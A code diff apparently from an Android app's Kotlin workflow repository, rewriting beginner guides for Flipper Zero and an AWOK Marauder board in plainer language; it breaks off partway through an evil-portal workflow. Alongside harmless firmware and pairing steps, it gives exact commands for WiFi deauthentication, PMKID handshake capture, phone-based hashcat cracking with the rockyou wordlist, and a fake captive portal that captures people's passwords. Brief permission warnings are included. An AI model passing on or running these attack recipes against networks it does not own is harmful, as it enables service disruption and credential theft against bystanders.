@@ -11,54 +11,54 @@ object WorkflowRepository {
 
     private val allWorkflows: List<Workflow> = listOf(
 
+        // ── SETUP ──────────────────────────────────────────────────────────────
+
         Workflow(
             id = "setup_momentum",
-            title = "Install Momentum Firmware",
-            subtitle = "Update Flipper Zero to Momentum custom firmware",
+            title = "Install Momentum Firmware on Flipper",
+            subtitle = "Upgrade your Flipper Zero with the best custom firmware",
             categoryId = "setup",
             hardware = listOf(Hardware.FLIPPER),
-            prerequisites = listOf("Flipper Zero", "PC or Android phone", "USB-C cable or Bluetooth"),
+            prerequisites = listOf("Flipper Zero", "Phone or PC", "USB-C cable"),
             steps = listOf(
                 WorkflowStep(
                     stepNumber = 1,
-                    title = "Download qFlipper App",
-                    description = "Install the official qFlipper app on your PC or use the Flipper mobile app on Android. qFlipper handles firmware updates wirelessly.",
-                    tips = listOf(
-                        "Available for Windows, macOS, Linux",
-                        "Android mobile app can also update firmware via Bluetooth"
-                    )
+                    title = "What Is Momentum Firmware?",
+                    description = "Momentum is a free upgrade for your Flipper Zero. It unlocks extra features like BLE Spam, more Sub-GHz frequencies, and a cooler interface. Think of it like jailbreaking — but totally safe and reversible.",
+                    tips = listOf("This is the most popular custom firmware", "It's signed so it updates safely through the official app")
                 ),
                 WorkflowStep(
                     stepNumber = 2,
-                    title = "Connect Flipper Zero",
-                    description = "Connect Flipper to PC via USB-C cable, or ensure Bluetooth is enabled on Flipper (Settings > Bluetooth > ON) for wireless update.",
-                    tips = listOf(
-                        "USB is faster and more reliable",
-                        "BT update takes ~10 minutes"
-                    )
+                    title = "Install the Flipper Mobile App",
+                    description = "On your Android phone, open Google Play Store. Search for 'Flipper Mobile App' (by Flipper Devices Inc). Install it — it's free.",
+                    tips = listOf("This is the OFFICIAL app — it's safe to use", "You can also use qFlipper on a PC if you prefer")
                 ),
                 WorkflowStep(
                     stepNumber = 3,
-                    title = "Open qFlipper & Select Device",
-                    description = "Open qFlipper. It auto-detects your Flipper. Click on the device name."
+                    title = "Turn On Bluetooth on Flipper",
+                    description = "On your Flipper, press the middle button to open the main menu. Use the D-pad arrows to scroll down to 'Settings'. Press OK. Scroll to 'Bluetooth'. Press OK. Make sure it says 'ON'.",
+                    commands = listOf(
+                        Command("Flipper menu path", "Settings → Bluetooth → Bluetooth → ON", Device.FLIPPER_CLI)
+                    )
                 ),
                 WorkflowStep(
                     stepNumber = 4,
-                    title = "Install Momentum Firmware",
-                    description = "In qFlipper click 'Update' and the latest Momentum firmware will be downloaded and installed automatically. Do NOT disconnect during update.",
-                    warning = "Never unplug during firmware flash — will brick device",
-                    tips = listOf(
-                        "Momentum firmware: https://momentum-fw.dev/",
-                        "Alternative: download .tgz from GitHub and drag into qFlipper"
-                    )
+                    title = "Pair Flipper to Your Phone",
+                    description = "Open the Flipper Mobile App. Tap the big '+' button in the top right. Your Flipper should appear in the list — tap its name. Both your phone and Flipper will show a number — make sure they match, then tap 'Pair' on your phone.",
+                    tips = listOf("If Flipper doesn't appear, make sure Bluetooth is ON on both devices")
                 ),
                 WorkflowStep(
                     stepNumber = 5,
-                    title = "Verify Installation",
-                    description = "After reboot Flipper shows 'Momentum' on boot screen. Navigate Main Menu > Settings > Firmware to confirm version.",
-                    tips = listOf(
-                        "Momentum adds: BLE Spam app, GPS SubDriving, rolling code support, 8 menu styles, control center"
-                    )
+                    title = "Update to Momentum",
+                    description = "In the Flipper app, tap your connected Flipper. Tap the firmware version area. You'll see update options — select 'Release Channel' → 'Momentum'. Tap 'Update'. The download starts automatically.",
+                    warning = "Do NOT close the app or unplug anything until the update finishes (about 5-10 minutes)",
+                    tips = listOf("Your Flipper screen will flicker — that's normal during install")
+                ),
+                WorkflowStep(
+                    stepNumber = 6,
+                    title = "Confirm It Worked",
+                    description = "When it reboots, you'll see 'Momentum' on the startup screen. Done! You now have the best Flipper firmware.",
+                    tips = listOf("New stuff you unlocked: BLE Spam app, more frequencies, Control Center, GPS tracking")
                 )
             )
         ),
@@ -66,209 +66,180 @@ object WorkflowRepository {
         Workflow(
             id = "setup_marauder",
             title = "Flash AWOK with Marauder",
-            subtitle = "Install ESP32 Marauder firmware on AWOK Dual Mini v3",
+            subtitle = "Install the Marauder WiFi attack firmware on your AWOK Dual Mini v3",
             categoryId = "setup",
             hardware = listOf(Hardware.AWOK),
-            prerequisites = listOf("AWOK Dual Mini v3", "PC with Python 3", "USB-C cable"),
+            prerequisites = listOf("AWOK Dual Mini v3", "PC with internet connection", "USB-C cable"),
             steps = listOf(
                 WorkflowStep(
                     stepNumber = 1,
-                    title = "Install Python",
-                    description = "Install Python 3.x and pip on your PC. Required for the flash tool.",
-                    commands = listOf(
-                        Command("Windows", "winget install Python.Python.3", Device.PC),
-                        Command("Mac/Linux", "brew install python3 OR sudo apt install python3", Device.PC)
-                    )
+                    title = "What Is Marauder?",
+                    description = "Marauder is the software (firmware) that makes your AWOK board do WiFi and Bluetooth attacks. Your AWOK probably already has it — you can check by plugging it in and seeing if the screen shows 'Marauder'. If yes, skip to the next workflow!",
+                    tips = listOf("If your AWOK shows a Marauder boot screen, you're already done!")
                 ),
                 WorkflowStep(
                     stepNumber = 2,
-                    title = "Install esptool",
-                    description = "Install esptool.py for flashing ESP32 devices.",
-                    commands = listOf(
-                        Command("Install esptool", "pip install esptool", Device.PC)
-                    )
+                    title = "Download the Easy Flash Tool",
+                    description = "On your PC, go to this website: github.com/Fr4nkFletcher/ESP32-Marauder-Cheap-Yellow-Display/releases — Click the latest release, scroll down to Assets, and download 'FZEasyMarauderFlash.zip'. Extract the zip file.",
+                    tips = listOf("This is the easiest way — it automatically picks the right file for your board")
                 ),
                 WorkflowStep(
                     stepNumber = 3,
-                    title = "Download Marauder Firmware",
-                    description = "Download the latest Marauder firmware .bin file for AWOK Dual Mini v3 from GitHub releases.",
-                    tips = listOf(
-                        "URL: github.com/justcallmekoko/ESP32Marauder/releases",
-                        "File: ESP32Marauder_AWOK_DualMini.bin (or similar)"
-                    )
+                    title = "Connect AWOK to PC in Flash Mode",
+                    description = "FIRST hold down the 'BOOT' button on your AWOK board (small button on the side). WHILE holding BOOT, plug the USB-C cable into your PC. THEN let go of the BOOT button. The board is now in flash mode.",
+                    warning = "If you don't hold BOOT while plugging in, it won't enter flash mode"
                 ),
                 WorkflowStep(
                     stepNumber = 4,
-                    title = "Connect AWOK in Flash Mode",
-                    description = "Connect AWOK Dual Mini v3 to PC via USB-C. Hold BOOT button while plugging in to enter flash mode.",
-                    tips = listOf(
-                        "Some units: hold BOOT then press RESET",
-                        "Device shows as COM port (Windows) or /dev/ttyUSB0 (Linux)"
-                    )
+                    title = "Run the Flash Tool",
+                    description = "Open the folder you extracted. Double-click 'flash.bat' (Windows) or 'flash.sh' (Mac/Linux). The tool will automatically find your AWOK, download the latest Marauder firmware, and install it. Watch the progress bar.",
+                    tips = listOf("Takes about 2-3 minutes", "You'll see green text scrolling — that's normal")
                 ),
                 WorkflowStep(
                     stepNumber = 5,
-                    title = "Flash Marauder Firmware",
-                    description = "Run esptool to flash Marauder.",
-                    commands = listOf(
-                        Command("Flash command", "esptool.py --port COM3 --baud 921600 write_flash 0x0 ESP32Marauder_AWOK_DualMini.bin", Device.PC)
-                    ),
-                    tips = listOf(
-                        "Replace COM3 with your actual port",
-                        "Linux: /dev/ttyUSB0 or /dev/ttyACM0"
-                    )
-                ),
-                WorkflowStep(
-                    stepNumber = 6,
-                    title = "Reboot and Verify",
-                    description = "Unplug and replug AWOK. Screen should show Marauder boot screen. Connect at 115200 baud and type 'help' to verify.",
-                    commands = listOf(
-                        Command("Serial connect", "screen /dev/ttyUSB0 115200", Device.TERMUX)
-                    )
+                    title = "Reboot and Check",
+                    description = "When the tool says 'Done!', unplug and replug your AWOK. You should see the Marauder logo and menus on screen. Success!",
+                    tips = listOf("If it shows a Marauder menu with options like WiFi, BLE, Bluetooth — you're all set!")
                 )
             )
         ),
 
         Workflow(
-            id = "setup_marauder_app",
-            title = "Install WiFi Marauder Flipper App",
-            subtitle = "Add the Marauder companion app to Flipper Zero",
+            id = "setup_connect_awok_flipper",
+            title = "Connect AWOK to Flipper Zero",
+            subtitle = "Wire up your AWOK Dual Mini v3 to control it through Flipper",
             categoryId = "setup",
             hardware = listOf(Hardware.BOTH),
-            prerequisites = listOf("Flipper Zero with custom firmware", "AWOK with Marauder", "GPIO wiring"),
+            prerequisites = listOf("Flipper Zero", "AWOK Dual Mini v3 with Marauder", "GPIO cable or AWOK stacking connector"),
             steps = listOf(
                 WorkflowStep(
                     stepNumber = 1,
-                    title = "Download Marauder .fap File",
-                    description = "Download the WiFi Marauder .fap file for Flipper Zero from GitHub.",
-                    tips = listOf(
-                        "URL: github.com/0xchocolate/flipperzero-wifi-marauder",
-                        "Or search 'WiFi Marauder' in Flipper app catalog"
-                    )
+                    title = "Two Ways to Connect",
+                    description = "You can connect AWOK to Flipper in two ways:\n1. DIRECT: Plug AWOK into Flipper's GPIO header (if your AWOK has a stacking connector) — the AWOK piggybacks on Flipper\n2. USB: Plug AWOK into your phone with USB-C OTG and control it with PennThis! app directly\n\nThe stacking connector method is much cooler — it's one unit!",
+                    tips = listOf("The AWOK Dual Mini v3 is designed to stack on top of or connect to Flipper")
                 ),
                 WorkflowStep(
                     stepNumber = 2,
-                    title = "Copy to Flipper SD Card",
-                    description = "Copy the .fap file to /ext/apps/GPIO/ folder on Flipper's SD card via USB.",
+                    title = "Install WiFi Marauder App on Flipper",
+                    description = "This is the bridge app that lets Flipper talk to your AWOK.\n\nOn Flipper: press the middle button → scroll to 'Apps' → press OK → scroll to 'GPIO' → look for '[ESP32] WiFi Marauder' → press OK to open it.",
+                    commands = listOf(
+                        Command("Flipper navigation", "Apps → GPIO → [ESP32] WiFi Marauder", Device.FLIPPER_CLI)
+                    ),
                     tips = listOf(
-                        "Connect Flipper via USB → appears as mass storage",
-                        "Create /ext/apps/GPIO/ if it doesn't exist"
+                        "If you don't see the app: connect Flipper to phone → Flipper App → Apps → search WiFi Marauder → Install",
+                        "Community app — free to download"
                     )
                 ),
                 WorkflowStep(
                     stepNumber = 3,
-                    title = "Launch the App",
-                    description = "On Flipper: Apps > GPIO > [ESP32] WiFi Marauder",
-                    commands = listOf(
-                        Command("Nav path", "Apps > GPIO > [ESP32] WiFi Marauder", Device.FLIPPER_CLI)
-                    )
+                    title = "First Time Setup in the App",
+                    description = "When the WiFi Marauder app opens on Flipper, you'll see a terminal screen. Use the arrow buttons to scroll. The first time, select 'Setup' and set the baud rate to 115200 — this is the speed Flipper and AWOK talk to each other.",
+                    tips = listOf("115200 = the speed setting — must match on both ends")
                 ),
                 WorkflowStep(
                     stepNumber = 4,
-                    title = "Set Baud Rate",
-                    description = "First time launch: select 'Setup'. Set baud rate to 115200. This matches AWOK's default.",
-                    tips = listOf(
-                        "If commands don't respond, verify baud rate match"
-                    )
+                    title = "Test the Connection",
+                    description = "In the Flipper app terminal, type: help\n\nPress the right arrow (or OK) to send. You should see a list of Marauder commands appear. If you see commands — AWOK is talking to Flipper successfully!",
+                    commands = listOf(
+                        Command("Test command", "help", Device.MARAUDER)
+                    ),
+                    tips = listOf("If nothing appears: check baud rate is 115200, check cables are seated properly")
                 )
             )
         ),
 
         Workflow(
             id = "setup_pair_bt",
-            title = "Pair Flipper to Android",
-            subtitle = "Connect Flipper Zero to your phone via Bluetooth",
+            title = "Pair Flipper to Your Android Phone",
+            subtitle = "Link your phone and Flipper Zero via Bluetooth",
             categoryId = "setup",
             hardware = listOf(Hardware.FLIPPER, Hardware.PHONE),
-            prerequisites = listOf("Flipper Zero", "Android phone", "Flipper Mobile App"),
+            prerequisites = listOf("Flipper Zero", "Android phone", "Flipper Mobile App installed"),
             steps = listOf(
                 WorkflowStep(
                     stepNumber = 1,
-                    title = "Enable Bluetooth on Flipper",
-                    description = "On Flipper: Settings > Bluetooth > Bluetooth > ON",
+                    title = "Turn On Flipper Bluetooth",
+                    description = "On your Flipper, press the middle button. Scroll down to 'Settings' with the down arrow. Press OK. Scroll to 'Bluetooth'. Press OK. Set it to 'ON' if it's not already.",
                     commands = listOf(
-                        Command("Navigate", "Settings > Bluetooth > Bluetooth > ON", Device.FLIPPER_CLI)
+                        Command("Menu path", "Settings → Bluetooth → Bluetooth → ON", Device.FLIPPER_CLI)
                     )
                 ),
                 WorkflowStep(
                     stepNumber = 2,
-                    title = "Install Flipper Mobile App",
-                    description = "Install official Flipper Mobile App from Google Play Store or F-Droid.",
-                    tips = listOf(
-                        "App: 'Flipper Mobile App' by Flipper Devices"
-                    )
+                    title = "Open the Flipper App on Your Phone",
+                    description = "Install 'Flipper Mobile App' from Google Play (search 'Flipper Mobile App' — it's free). Open the app. Make sure Bluetooth is ON on your phone too.",
+                    tips = listOf("You only need to pair once — after that it connects automatically")
                 ),
                 WorkflowStep(
                     stepNumber = 3,
-                    title = "Pair in App",
-                    description = "Open mobile app > tap '+' > select your Flipper from the list > tap 'Connect'",
+                    title = "Connect Them Together",
+                    description = "In the Flipper app, tap the '+' button. Your Flipper's name will appear. Tap it. Both your Flipper screen and phone will show the same number — make sure they match! Tap 'Pair' on your phone. Done.",
                     tips = listOf(
-                        "Flipper shows pairing code — confirm on both devices"
+                        "The pair code only appears for 30 seconds — act quickly!",
+                        "If pairing fails: turn Flipper BT off and back on, then try again"
                     )
                 ),
                 WorkflowStep(
                     stepNumber = 4,
-                    title = "Verify Connection",
-                    description = "App shows device connected, battery %, firmware version. You can now update firmware wirelessly and sync saved keys.",
-                    tips = listOf(
-                        "Use 'Remote Control' in app to navigate Flipper menus from phone"
-                    )
+                    title = "What You Can Do Now",
+                    description = "With the connection, you can:\n• Update firmware wirelessly\n• Download and install new apps\n• Use 'Remote Control' to control Flipper from your phone\n• Read NFC keys with the mfkey32 cracker tool",
+                    tips = listOf("The app stays connected automatically whenever you're nearby")
                 )
             )
         ),
 
+        // ── WIFI ───────────────────────────────────────────────────────────────
+
         Workflow(
             id = "wifi_scan",
-            title = "Scan WiFi Networks",
-            subtitle = "Discover all nearby access points and connected clients",
+            title = "Scan All Nearby WiFi Networks",
+            subtitle = "See every WiFi network and device around you",
             categoryId = "wifi",
-            hardware = listOf(Hardware.AWOK),
-            prerequisites = listOf("AWOK Dual Mini v3 with Marauder", "Flipper with Marauder app OR direct USB serial"),
+            hardware = listOf(Hardware.AWOK, Hardware.FLIPPER),
+            prerequisites = listOf("AWOK with Marauder firmware", "Either: Flipper with AWOK connected, OR AWOK plugged into phone via USB-C OTG"),
             steps = listOf(
                 WorkflowStep(
                     stepNumber = 1,
-                    title = "Launch Marauder App",
-                    description = "On Flipper: Apps > GPIO > [ESP32] WiFi Marauder",
+                    title = "Open the Marauder Terminal",
+                    description = "OPTION A — Via Flipper:\nOn Flipper, go to Apps → GPIO → [ESP32] WiFi Marauder. You'll see a black terminal screen.\n\nOPTION B — Via PennThis! app:\nPlug AWOK into phone with USB-C OTG cable. In PennThis!, tap 'Connect AWOK'. The terminal opens in the app.",
                     commands = listOf(
-                        Command("Navigate", "Apps > GPIO > [ESP32] WiFi Marauder", Device.FLIPPER_CLI)
+                        Command("Via Flipper", "Apps → GPIO → [ESP32] WiFi Marauder", Device.FLIPPER_CLI)
                     )
                 ),
                 WorkflowStep(
                     stepNumber = 2,
-                    title = "Scan Access Points",
-                    description = "Run scanap to discover all nearby access points.",
+                    title = "Start the WiFi Scan",
+                    description = "Type 'scanap' and press the send button (right arrow on Flipper, or tap Send in app). Wait about 15 seconds. You'll see all the WiFi networks near you start popping up on screen.",
                     commands = listOf(
-                        Command("Scan APs", "scanap", Device.MARAUDER)
+                        Command("Scan access points", "scanap", Device.MARAUDER)
                     ),
                     tips = listOf(
-                        "Shows: SSID, BSSID, Channel, RSSI (signal strength), Security (WPA2/WPA3/Open)"
+                        "Each line shows: network name (SSID), MAC address (BSSID), channel number, signal strength (RSSI), and security type (WPA2, Open, etc.)"
                     )
                 ),
                 WorkflowStep(
                     stepNumber = 3,
-                    title = "View AP Results",
-                    description = "Run listap to see all discovered APs.",
+                    title = "Stop the Scan",
+                    description = "When you've seen enough, type 'stopscan' to stop.",
                     commands = listOf(
-                        Command("List results", "listap", Device.MARAUDER)
+                        Command("Stop", "stopscan", Device.MARAUDER)
                     )
                 ),
                 WorkflowStep(
                     stepNumber = 4,
-                    title = "Scan Connected Clients",
-                    description = "Run scansta to find connected devices on each AP.",
+                    title = "See the Full List",
+                    description = "To see all the networks found (in a clean numbered list), type 'listap'. Each network gets a number — you'll use these numbers to target specific networks.",
                     commands = listOf(
-                        Command("Scan stations", "scansta", Device.MARAUDER)
+                        Command("List all APs", "listap", Device.MARAUDER)
                     ),
-                    tips = listOf(
-                        "Takes 30-60 seconds. Shows MAC addresses of connected devices"
-                    )
+                    tips = listOf("Write down the number of the network you want to work with!")
                 ),
                 WorkflowStep(
                     stepNumber = 5,
-                    title = "Stop Scan",
-                    description = "Stop all running scans.",
+                    title = "Scan Who's Connected (Optional)",
+                    description = "Want to see which devices (phones, laptops, etc.) are connected to nearby networks? Type 'scansta'. It shows connected devices by their MAC address.",
                     commands = listOf(
-                        Command("Stop", "stopscan", Device.MARAUDER)
+                        Command("Scan stations (clients)", "scansta", Device.MARAUDER)
                     )
                 )
             )
@@ -276,63 +247,49 @@ object WorkflowRepository {
 
         Workflow(
             id = "wifi_deauth",
-            title = "Deauthenticate WiFi Clients",
-            subtitle = "Disconnect all clients from a target access point",
+            title = "Kick Devices Off a WiFi Network",
+            subtitle = "Send deauth frames to disconnect clients from an access point",
             categoryId = "wifi",
-            hardware = listOf(Hardware.AWOK),
-            prerequisites = listOf("AWOK Dual Mini v3 with Marauder", "Target network in range"),
+            hardware = listOf(Hardware.AWOK, Hardware.FLIPPER),
+            prerequisites = listOf("AWOK with Marauder", "Flipper OR phone with PennThis!"),
             steps = listOf(
                 WorkflowStep(
                     stepNumber = 1,
-                    title = "Scan for Access Points",
-                    description = "First scan to find target network.",
+                    title = "Scan and Find Your Target",
+                    description = "Type 'scanap' — wait 15 seconds — type 'stopscan' — then type 'listap'. Find the network you want (only do this on YOUR OWN network!) and note its number. For example, if your network shows up as #2, you'll use 2.",
                     commands = listOf(
-                        Command("Scan", "scanap", Device.MARAUDER)
+                        Command("Scan", "scanap", Device.MARAUDER),
+                        Command("Stop", "stopscan", Device.MARAUDER),
+                        Command("List", "listap", Device.MARAUDER)
                     ),
-                    tips = listOf("Wait 10-15 seconds for full scan")
+                    warning = "Only test on networks you own or have written permission to test. Attacking others' networks is illegal."
                 ),
                 WorkflowStep(
                     stepNumber = 2,
-                    title = "Stop Scan",
-                    description = "Stop the AP scan before proceeding.",
+                    title = "Pick Your Target Network",
+                    description = "Type 'select -a' followed by the number from the list. For example, if your network was #2, type: select -a 2\n\nThis 'aims' the AWOK at that specific network.",
                     commands = listOf(
-                        Command("Stop", "stopscan", Device.MARAUDER)
-                    )
+                        Command("Select network #0", "select -a 0", Device.MARAUDER),
+                        Command("Select network #1", "select -a 1", Device.MARAUDER)
+                    ),
+                    tips = listOf("Replace 0 with your actual network number from the listap output")
                 ),
                 WorkflowStep(
                     stepNumber = 3,
-                    title = "List Access Points",
-                    description = "View discovered APs with their index numbers.",
+                    title = "Launch the Deauth Attack",
+                    description = "Type 'attack -t deauth' and press Send. The AWOK starts sending 'disconnect' messages to all devices on that network. Phones, laptops, and smart TVs will lose WiFi.",
                     commands = listOf(
-                        Command("List", "listap", Device.MARAUDER)
+                        Command("Start deauth", "attack -t deauth", Device.MARAUDER)
+                    ),
+                    tips = listOf(
+                        "Devices will try to reconnect automatically — this is actually useful for capturing handshakes (see the PMKID capture workflow)",
+                        "Works for about 10 meters around you"
                     )
                 ),
                 WorkflowStep(
                     stepNumber = 4,
-                    title = "Select Target AP",
-                    description = "Select AP by index number (shown in listap output).",
-                    commands = listOf(
-                        Command("Select AP 0", "select -a 0", Device.MARAUDER)
-                    ),
-                    tips = listOf("Replace 0 with actual index of target network")
-                ),
-                WorkflowStep(
-                    stepNumber = 5,
-                    title = "Launch Deauth Attack",
-                    description = "Send continuous deauth frames. All clients on selected AP will be disconnected.",
-                    commands = listOf(
-                        Command("Deauth attack", "attack -t deauth", Device.MARAUDER)
-                    ),
-                    warning = "Only perform on networks you own or have permission to test",
-                    tips = listOf(
-                        "Clients auto-reconnect immediately when attack stops",
-                        "Use this to force reconnect for handshake capture"
-                    )
-                ),
-                WorkflowStep(
-                    stepNumber = 6,
-                    title = "Stop Attack",
-                    description = "Stop the deauth attack.",
+                    title = "Stop the Attack",
+                    description = "Type 'stopscan' to stop. All devices will reconnect automatically after you stop.",
                     commands = listOf(
                         Command("Stop", "stopscan", Device.MARAUDER)
                     )
@@ -342,92 +299,89 @@ object WorkflowRepository {
 
         Workflow(
             id = "wifi_pmkid",
-            title = "Capture WiFi Password (PMKID)",
-            subtitle = "Capture WPA2 handshake and crack the network password",
+            title = "Capture WiFi Password & Crack It",
+            subtitle = "Capture WPA2 handshake with AWOK, then crack with Termux hashcat",
             categoryId = "wifi",
-            hardware = listOf(Hardware.AWOK),
-            prerequisites = listOf("AWOK Dual Mini v3 with Marauder", "Hashcat on PC or Termux", "Wordlist"),
+            hardware = listOf(Hardware.AWOK, Hardware.FLIPPER, Hardware.PHONE),
+            prerequisites = listOf("AWOK with Marauder + Flipper", "Termux app on phone from F-Droid", "hashcat installed in Termux"),
             steps = listOf(
                 WorkflowStep(
                     stepNumber = 1,
-                    title = "Scan and Select Target",
-                    description = "Scan APs, select your target network by index.",
+                    title = "Scan and Pick Your Network",
+                    description = "Type 'scanap', wait, 'stopscan', then 'listap'. Find your target network and note its number. Then type: select -a NUMBER",
                     commands = listOf(
                         Command("Scan", "scanap", Device.MARAUDER),
-                        Command("Stop", "stopscan", Device.MARAUDER),
-                        Command("List", "listap", Device.MARAUDER),
-                        Command("Select", "select -a 0", Device.MARAUDER)
-                    )
+                        Command("Stop & list", "stopscan && listap", Device.MARAUDER),
+                        Command("Select (use your number)", "select -a 0", Device.MARAUDER)
+                    ),
+                    warning = "Only capture from your own network or networks you have permission to test"
                 ),
                 WorkflowStep(
                     stepNumber = 2,
-                    title = "Start PMKID Sniff",
-                    description = "Capture PMKID from first handshake frame — no deauth needed. Router sends PMKID proactively.",
+                    title = "Start PMKID Capture",
+                    description = "Type 'sniffpmkid' and press Send. The AWOK quietly listens for the special handshake packets that routers send. You don't need to kick anyone off — it just waits and listens.",
                     commands = listOf(
-                        Command("Sniff PMKID", "sniffpmkid", Device.MARAUDER)
+                        Command("Capture PMKID", "sniffpmkid", Device.MARAUDER)
                     ),
                     tips = listOf(
-                        "Wait 30-120 seconds",
-                        "More reliable if clients are actively connected",
-                        "PCAP auto-saved to SD card"
+                        "Wait 30-60 seconds. The more devices actively connected to that router, the faster you'll get a capture",
+                        "You'll see 'PMKID found' on screen when successful"
                     )
                 ),
                 WorkflowStep(
                     stepNumber = 3,
-                    title = "Force Reconnect (Optional)",
-                    description = "Run deauth briefly to force clients to reconnect and emit fresh PMKID.",
+                    title = "Speed It Up (Optional Deauth Trick)",
+                    description = "If nothing is captured after 60 seconds, run a quick deauth to make devices reconnect (which sends handshake packets):\nType 'stopscan', then 'attack -t deauth', wait 5 seconds, then 'stopscan', then 'sniffpmkid' again.",
                     commands = listOf(
-                        Command("Deauth briefly", "attack -t deauth", Device.MARAUDER)
-                    ),
-                    tips = listOf("Stop after 5 seconds")
+                        Command("Quick deauth boost", "attack -t deauth", Device.MARAUDER)
+                    )
                 ),
                 WorkflowStep(
                     stepNumber = 4,
-                    title = "Stop Capture and Locate PCAP",
-                    description = "Stop capture. Connect Flipper via USB and navigate to PCAP file.",
+                    title = "Stop and Find the Capture File",
+                    description = "Type 'stopscan'. The AWOK automatically saves the capture file to Flipper's SD card.\n\nTo find it: connect Flipper to your phone via USB. On your phone's file manager, go to Flipper's storage → apps_data → marauder → pcaps → you'll see a .pcap file.",
                     commands = listOf(
-                        Command("Stop", "stopscan", Device.MARAUDER)
+                        Command("Stop capture", "stopscan", Device.MARAUDER)
                     ),
-                    tips = listOf(
-                        "PCAP location: /apps_data/marauder/pcaps/ on Flipper SD",
-                        "Copy .pcap file to your Android phone Downloads folder"
-                    )
+                    tips = listOf("Copy the .pcap file to your phone's Downloads folder — you need it for the next steps")
                 ),
                 WorkflowStep(
                     stepNumber = 5,
-                    title = "Verify in Wireshark",
-                    description = "Open PCAP in Wireshark on PC. Filter for EAPOL frames to confirm capture.",
-                    commands = listOf(
-                        Command("Wireshark filter", "eapol", Device.PC)
-                    ),
-                    tips = listOf(
-                        "Look for 'Message (1 of 4)' frames — these contain PMKID",
-                        "EAPOL frames confirm valid WPA handshake capture"
-                    )
+                    title = "Convert the Capture File",
+                    description = "Go to this website on your phone's browser: hashcat.net/cap2hashcat\n\nTap 'Choose File', pick your .pcap file from Downloads, tap Upload. It will give you a .hc22000 file — download it.",
+                    tips = listOf("This converts the WiFi capture into a format hashcat can crack", "Save the .hc22000 file to your Downloads folder")
                 ),
                 WorkflowStep(
                     stepNumber = 6,
-                    title = "Convert to Hashcat Format",
-                    description = "Use cap2hashcat to convert PCAP to hashcat format.",
+                    title = "Install hashcat in Termux",
+                    description = "Open Termux. Type these commands one at a time:\n\npkg update -y\npkg install hashcat -y\n\nWait for it to finish downloading and installing.",
                     commands = listOf(
-                        Command("Online tool", "https://hashcat.net/cap2hashcat/", Device.PC),
-                        Command("Or local", "hcxtools: hcxpcapngtool -o output.hc22000 capture.pcap", Device.PC)
-                    )
+                        Command("Update packages", "pkg update -y", Device.TERMUX),
+                        Command("Install hashcat", "pkg install hashcat -y", Device.TERMUX)
+                    ),
+                    tips = listOf("hashcat IS available in Termux and works on your phone without root")
                 ),
                 WorkflowStep(
                     stepNumber = 7,
-                    title = "Crack the Password",
-                    description = "Run hashcat to crack the password.",
+                    title = "Download a Password List",
+                    description = "In Termux, download the rockyou.txt wordlist (14 million common passwords):",
                     commands = listOf(
-                        Command("Dictionary attack", "hashcat -m 22000 output.hc22000 /path/to/wordlist.txt", Device.PC),
-                        Command("In Termux", "hashcat -m 22000 output.hc22000 /sdcard/wordlist.txt", Device.TERMUX),
-                        Command("8-digit PIN brute", "hashcat -m 22000 output.hc22000 -a 3 ?d?d?d?d?d?d?d?d", Device.PC),
-                        Command("8-char alpha", "hashcat -m 22000 output.hc22000 -a 3 ?l?l?l?l?l?l?l?l", Device.PC)
+                        Command("Download wordlist", "curl -L -o ~/rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt", Device.TERMUX)
+                    ),
+                    tips = listOf("This is a 130MB download — use WiFi!")
+                ),
+                WorkflowStep(
+                    stepNumber = 8,
+                    title = "Crack the Password",
+                    description = "In Termux, run hashcat on your capture. Replace 'capture.hc22000' with your actual filename:",
+                    commands = listOf(
+                        Command("Dictionary attack", "hashcat -m 22000 /sdcard/Download/capture.hc22000 ~/rockyou.txt", Device.TERMUX),
+                        Command("Try 8-digit PIN (like 12345678)", "hashcat -m 22000 /sdcard/Download/capture.hc22000 -a 3 ?d?d?d?d?d?d?d?d", Device.TERMUX),
+                        Command("See the result", "hashcat -m 22000 /sdcard/Download/capture.hc22000 --show", Device.TERMUX)
                     ),
                     tips = listOf(
-                        "Popular wordlists: rockyou.txt, SecLists WiFi wordlists",
-                        "GPU cracking on PC is 100x faster than CPU",
-                        "8-char all-digit: cracks in seconds on GPU"
+                        "Phone cracking is slower than a PC with a GPU — an 8-digit number might take 20 minutes on phone",
+                        "If the password is in rockyou.txt (most common passwords are), dictionary mode is fastest"
                     )
                 )
             )
@@ -435,92 +389,51 @@ object WorkflowRepository {
 
         Workflow(
             id = "wifi_evilportal",
-            title = "Evil Portal — Credential Harvest",
-            subtitle = "Create a fake AP with captive portal to capture credentials",
+            title = "Evil Portal — Fake WiFi Login Page",
+            subtitle = "Create a fake WiFi network that captures usernames and passwords",
             categoryId = "wifi",
-            hardware = listOf(Hardware.AWOK),
-            prerequisites = listOf("AWOK Dual Mini v3 with Marauder", "Target WiFi network name"),
+            hardware = listOf(Hardware.AWOK, Hardware.FLIPPER),
+            prerequisites = listOf("AWOK with Marauder", "Flipper with WiFi Marauder app"),
             steps = listOf(
                 WorkflowStep(
                     stepNumber = 1,
-                    title = "Scan to Find Target SSID",
-                    description = "Scan to identify target network name (SSID) for spoofing.",
-                    commands = listOf(
-                        Command("Scan", "scanap", Device.MARAUDER)
-                    )
+                    title = "How This Works",
+                    description = "The AWOK creates a fake WiFi network. When someone connects to it, instead of getting the internet, they get a fake 'login page' that looks like a router setup page. Whatever they type in gets saved to the SD card.\n\nOnly do this on your own devices or with permission.",
+                    warning = "Only test this on your own network and devices"
                 ),
                 WorkflowStep(
                     stepNumber = 2,
-                    title = "Start Evil Portal",
-                    description = "Launch evil portal attack. Creates fake WiFi AP with captive portal login page.",
+                    title = "Find the Real Network Name",
+                    description = "First, scan to find the name (SSID) of the real network you want to mimic:\nType 'scanap' → wait → 'stopscan' → 'listap'\n\nWrite down the exact network name — capital letters and spaces matter!",
                     commands = listOf(
-                        Command("Start", "evilportal", Device.MARAUDER)
-                    ),
-                    tips = listOf("Default SSID: 'Free WiFi' — change this to match real network name")
+                        Command("Find real SSID", "scanap", Device.MARAUDER)
+                    )
                 ),
                 WorkflowStep(
                     stepNumber = 3,
-                    title = "Set Target SSID via Flipper App",
-                    description = "In the WiFi Marauder Flipper app: select 'Evil Portal' > enter the exact SSID of target network",
+                    title = "Start the Evil Portal",
+                    description = "In the WiFi Marauder app on Flipper, scroll the menu to 'Evil Portal'. Press OK. You'll see options to set the fake network name. Enter the EXACT same name as the real network.",
+                    commands = listOf(
+                        Command("Start evil portal", "evilportal", Device.MARAUDER)
+                    ),
                     tips = listOf(
